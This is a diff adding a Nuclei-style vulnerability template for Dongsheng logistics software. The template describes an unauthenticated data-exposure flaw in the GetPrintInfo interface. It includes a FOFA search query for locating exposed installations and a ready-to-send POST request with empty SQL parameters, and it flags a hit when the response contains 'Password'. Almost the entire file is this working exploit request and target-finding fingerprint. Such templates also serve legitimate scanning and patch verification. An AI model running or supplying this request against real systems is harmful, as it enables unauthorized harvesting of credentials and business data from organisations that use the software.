@@ -1,0 +1,30 @@
+id: dongsheng-logistics-getprintinfo-info-leak
+
+info:
+  name: 东胜物流软件GetPrintInfo接口敏感数据暴露漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" ||body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+          青岛东胜伟业软件有限公司开发的物流管理系统中，GetPrintInfo接口因权限校验机制缺失，导致系统内部敏感数据可通过未授权访问获取。该漏洞允许攻击者直接调用接口获取包含业务逻辑的敏感信息。
+  tags: 东胜物流软件
+
+http:
+- raw:
+  - |
+    POST /CommMng/Print/GetPrintInfo HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+
+    type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Password'
